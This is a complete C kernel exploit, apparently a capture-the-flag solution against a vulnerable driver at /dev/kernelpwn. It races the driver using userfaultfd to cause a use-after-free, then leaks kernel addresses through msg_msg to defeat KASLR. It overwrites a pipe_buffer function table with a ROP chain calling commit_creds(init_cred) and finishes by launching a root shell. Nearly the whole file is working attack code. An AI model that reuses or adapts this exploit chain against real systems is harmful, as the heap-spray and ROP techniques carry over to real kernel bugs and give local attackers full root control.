#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
 
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/socket.h>

#define PIPE_BUFFER_NUM 1
#define QID_NUM 1
#define GLOBAL_FUNC_TABLE 0xffffffff8203ed80
size_t pop_rdi = 0xffffffff8108c420; // pop rdi ; ret
size_t magic_gadget = 0xFFFFFFFF812C4CCE;
size_t swapgs_kpti = 0xFFFFFFFF81C00FCB;
size_t init_cred = 0xffffffff82a6b700;
size_t commit_creds = 0xffffffff810c9540;
size_t kernel_offset = 0;
size_t pipe_buffer_addr = 0;

int fd;
int qid;
int global_pipe_fd[2];
size_t uffd_buf[512];
pthread_t moniter_thr;
sem_t add_leak;
sem_t edit_leak;
sem_t add_hijack;
sem_t edit_hijack;
sem_t continue_sem;

struct args {
	size_t idx;
	size_t size;
	char* buf;
};

struct msg_buf {
	long m_type;
	char m_text[1];
};

struct msg_header {
	void* l_next;
	void* l_prev;
	size_t m_type;
	size_t m_ts;
	void* next;
	void* security;
};

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    exit(EXIT_FAILURE);
}

void add(char* buf)
{
	struct args arg = { .size = buf };
	if (ioctl(fd, 0x20, &arg) < 0) err_exit("add object"); 
}

void dele(size_t idx)
{
	struct args arg = { .idx = idx };
	ioctl(fd, 0x30, &arg);
}

void edit(size_t idx, size_t size, char* buf)
{
	struct args arg = { .idx = idx, .size = size, .buf = buf };
	ioctl(fd, 0x50, &arg);
}


void info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\n\033[0m", msg);
}

void hexx(char *msg, size_t value)
{
    printf("\033[32m\033[1m[+] %s: %#lx\n\033[0m", msg, value);
}

void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

/* root checker and shell poper */
void get_root_shell(void)
{
    if(getuid()) {
        puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
        sleep(5);
        exit(EXIT_FAILURE);
    }

    puts("\033[32m\033[1m[+] Successful to get the root. \033[0m");
    puts("\033[34m\033[1m[*] Execve root shell now...\033[0m");

    char* args[] = { "/bin/sh", NULL };
    execve("/bin/sh", args, NULL);

//    system("/bin/sh");

    /* to exit the process normally, instead of segmentation fault */
    exit(EXIT_SUCCESS);
}

/* userspace status saver */
size_t user_cs, user_ss, user_rflags, user_rsp;
void save_status()
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

/* bind the process to specific core */
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

void register_userfaultfd(void* buf, void* handler)
{
	long uffd;
	struct uffdio_api uffdio_api;
	struct uffdio_register uffdio_register;
	
	uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);
	if (uffd < 0) err_exit("syscall __NR_userfaultfd");
	
	uffdio_api.api = UFFD_API;
	uffdio_api.features = 0;
	if (ioctl(uffd, UFFDIO_API, &uffdio_api) < 0) err_exit("ioctl UFFDIO_API");

	uffdio_register.range.start = (unsigned long)buf;
	uffdio_register.range.len = 0x1000;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) < 0) err_exit("ioctl UFFDIO_REGISTER");

	if (pthread_create(&moniter_thr, NULL, handler, (void*)uffd)) err_exit("pthread_create userfaultfd"); 
}


void leak(void* args)
{
	long uffd;
	struct uffd_msg msg;
	struct uffdio_copy uffdio_copy;

	uffd = (long)args;

	for (;;)
	{	
		int res;
		struct pollfd pollfd;
		pollfd.fd = uffd;
		pollfd.events = POLLIN;
		if (poll(&pollfd, 1, -1) == -1) err_exit("poll in leak thread");
		
		
		res = read(uffd, &msg, sizeof(msg));
		if (res == 0) err_exit("EOF in leak userfaultfd");
		if (res == -1) err_exit("read in leak thread");
		if (msg.event != UFFD_EVENT_PAGEFAULT) err_exit("err event in leak thread");
		
		info("Leak in userfaultfd");
		sem_post(&add_leak);
		uffd_buf[0] = 0xdeadbeef;
		uffd_buf[1] = 0xbeefdead;
		uffd_buf[2] = 1;
		uffd_buf[3] = 0x1000-0x30;
		sem_wait(&edit_leak);

		uffdio_copy.src = (unsigned long)uffd_buf;
		uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(0x1000-1);
		uffdio_copy.len = 0x1000;
		uffdio_copy.mode = 0;
		uffdio_copy.copy = 0;
		if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) err_exit("ioctl UFFDIO_COPY in leak thread");
		sem_post(&continue_sem);
	}
}

void uaf_to_leak(void* args)
{
	struct msg_buf* msg;
	char msg_buffer[0x400];
	memset(msg_buffer, 'A', sizeof(msg_buffer));
	msg = (struct msg_buf*)msg_buffer;
	msg->m_type = 1;
	sem_wait(&add_leak);
	info("uaf_to_msgmsg");
	dele(0);
	qid = msgget(IPC_PRIVATE, 0666|IPC_CREAT);
	if (qid < 0) err_exit("msgget in uaf_to_msgmsg");
	if (msgsnd(qid, msg, 0x400-0x30, 0) < 0) err_exit("msgsnd int uaf_to_msgmsg");
	sem_post(&edit_leak);
}

void hijack(void* args)
{
	long uffd;
	struct uffd_msg msg;
	struct uffdio_copy uffdio_copy;

	uffd = (long)args;

	for (;;)
	{
		int res;
		struct pollfd pollfd;
		pollfd.fd = uffd;
		pollfd.events = POLLIN;
		if (poll(&pollfd, 1, -1) == -1) err_exit("poll in hijack thread");
		
		res = read(uffd, &msg, sizeof(msg));
		if (res == 0) err_exit("EOF in hijack userfaultfd");
		if (res == -1) err_exit("read in hijack thread");
		if (msg.event != UFFD_EVENT_PAGEFAULT) err_exit("err event in hijack thread");
		
		info("Hijack in userfaultfd");
		sem_post(&add_hijack);
		uffd_buf[0] = 0;
		uffd_buf[1] = 0;
		uffd_buf[2] = pipe_buffer_addr+0x20;
		uffd_buf[3] = 0;
		uffd_buf[4] = pop_rdi+kernel_offset;
		uffd_buf[5] = magic_gadget+kernel_offset;
		uffd_buf[6] = pop_rdi+kernel_offset;
		uffd_buf[7] = init_cred+kernel_offset;
		uffd_buf[8] = commit_creds+kernel_offset;
		uffd_buf[9] = swapgs_kpti+kernel_offset;
		uffd_buf[10] = 0;
		uffd_buf[11] = 0;
		uffd_buf[12] = get_root_shell;
		uffd_buf[13] = user_cs;
		uffd_buf[14] = user_rflags;
		uffd_buf[15] = user_rsp;
		uffd_buf[16] = user_ss;
		sem_wait(&edit_hijack);	
		
		uffdio_copy.src = (unsigned long)uffd_buf;
		uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(0x1000-1);
		uffdio_copy.len = 0x1000;
		uffdio_copy.mode = 0;
		uffdio_copy.copy = 0;
		if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) err_exit("ioctl UFFDIO_COPY in hijack thread");
		sem_post(&continue_sem);
	}
}

void uaf_to_hijack_pipe_buffer(void* args)
{
	int res;
	sem_wait(&add_hijack);
	dele(0);
	info("uaf_to_pipe_buffer");
	res = pipe(global_pipe_fd);
	if (res < 0) err_exit("create pipe");
	res = write(global_pipe_fd[1], "pwnpwner", 8);
	if (res < 0) err_exit("write pipe");
	sem_post(&edit_hijack);
}

int main(int argc, char** argv, char** env)
{
	bind_core(0);
	save_status();
	pthread_t leak_thr;
	pthread_t hijack_thr;
	char arg_buf[1024];
	size_t buf[1024];
//	size_t kernel_offset;
	int pipe_fd[PIPE_BUFFER_NUM][2];
	char *uffd_buf1;
	char *uffd_buf2;
	int res;
	int my_qid[QID_NUM];
	struct msg_buf* msg;
	struct msg_header* first_msg;
	struct msg_header* second_msg;
	char message[0x400];
	
	msg = (struct msg_buf*)message;
	fd = open("/dev/kernelpwn", O_RDWR);
	if (fd < 0) err_exit("open /dev/kernelpwn");
	
	uffd_buf1 = (char*)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1 , 0);
	uffd_buf2 = (char*)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1 , 0);
	register_userfaultfd(uffd_buf1, (void*)leak);
	register_userfaultfd(uffd_buf2, (void*)hijack);

	sem_init(&add_leak, 0, 0);
	sem_init(&edit_leak, 0, 0);
	sem_init(&add_hijack, 0, 0);
	sem_init(&edit_hijack, 0, 0);
	sem_init(&continue_sem, 0, 0);

	pthread_create(&leak_thr, NULL, uaf_to_leak, NULL);
	pthread_create(&hijack_thr, NULL, uaf_to_hijack_pipe_buffer, NULL);

	memset(arg_buf, 'A', sizeof(arg_buf));
	add(arg_buf);
	edit(0, 0x20, uffd_buf1);
	sem_wait(&continue_sem);
	
	for (int i = 0; i < PIPE_BUFFER_NUM; i++)
	{
		if (pipe(pipe_fd[i]) < 0) err_exit("create pipe");
		if (write(pipe_fd[i][1], "pwnpwner", 8) < 0) err_exit("write pipe");
	}

	for (int i = 0; i < QID_NUM; i++)
	{
		my_qid[i] = msgget(IPC_PRIVATE, 0666|IPC_CREAT);
		if (my_qid[i] < 0) err_exit("msgget in uaf_to_msgmsg");
		msg->m_type = 1;
		*(int*)&msg->m_text[0] = 0xAAAAAAAA + 0x11111111*i;
		if (msgsnd(my_qid[i], msg, 0x400-0x30, 0) < 0) err_exit("msgsnd int uaf_to_msgmsg");
		msg->m_type = 2;
		*(int*)&msg->m_text[0] = 0xAAAAAAAA + 0x11111111*(i+1);
		if (msgsnd(my_qid[i], msg, 0x400-0x30, 0) < 0) err_exit("msgsnd int uaf_to_msgmsg");
	}

	res = msgrcv(qid, buf, 0x1000-0x30, 0, MSG_COPY|IPC_NOWAIT|MSG_NOERROR);
	if (res < 0) err_exit("msgrev");
	hexx("msgrcv msgmsg length", res);
	binary_dump("msg_msg data", (char*)buf+8+0x400-0x30, 0xc00);
	if (buf[123+2] < 0xffffffff81000000 || (buf[123+2]&0xfff) != 0xd80) err_exit("No OOB the pipe_buffer");
	kernel_offset = buf[123+2] - GLOBAL_FUNC_TABLE;
	hexx("kernel_offset", kernel_offset);

	first_msg = (struct msg_header*)((char*)buf+8+0x400-0x30+0x400);
	second_msg = (struct msg_header*)((char*)buf+8+0x400-0x30+0x800);
	pipe_buffer_addr = second_msg->l_prev;
	if (*(int*)((char*)first_msg+0x30) != 0xaaaaaaaa) err_exit("the nearby object is not first_msg");
	if (*(int*)((char*)second_msg+0x30) != 0xbbbbbbbb) err_exit("the nearby object is not second_msg");
	hexx("first_msg->l_next", first_msg->l_next);
	hexx("first_msg->l_prev", first_msg->l_prev);
	hexx("second_msg->l_next", second_msg->l_next);
	hexx("second_msg->l_prev", second_msg->l_prev);
	hexx("pipe_buffer_addr", pipe_buffer_addr);

	for (int i = 0; i < QID_NUM; i++)
	{
		res = msgrcv(my_qid[i], buf, 0x400-0x30, 2, 0);
		if (res < 0) err_exit("msgrev unlink");
		hexx("msgrcv msgmsg length", res);
		res = msgrcv(my_qid[i], buf, 0x400-0x30, 1, 0);
		if (res < 0) err_exit("msgrev unlink");
		hexx("msgrcv msgmsg length", res);
	}

	add(arg_buf);
	edit(0, 0x100, uffd_buf2);
	sem_wait(&continue_sem);
	
	if (close(global_pipe_fd[0]) < 0) err_exit("close pipe");
	if (close(global_pipe_fd[1]) < 0) err_exit("close pipe");

        return 0;
}
